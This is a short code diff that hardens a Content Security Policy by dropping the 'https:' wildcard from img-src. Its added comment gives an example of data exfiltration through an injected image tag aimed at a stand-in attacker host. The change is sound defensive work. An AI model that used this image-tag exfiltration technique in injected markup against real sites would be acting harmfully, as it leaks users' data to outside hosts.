@@ -39,7 +39,9 @@ export function buildCsp(nonce: string): string {
     'form-action': ["'self'"],
     'frame-ancestors': ["'none'"],
     'object-src': ["'none'"],
-    'img-src': ["'self'", 'data:', 'blob:', 'https:'],
+    // No remote images are embedded. An https: wildcard here would let injected
+    // markup exfiltrate data through <img src="https://attacker/?d=...">.
+    'img-src': ["'self'", 'data:', 'blob:'],
     'font-src': ["'self'", 'data:'],
     'style-src': ["'self'", "'unsafe-inline'"],
     'script-src': [
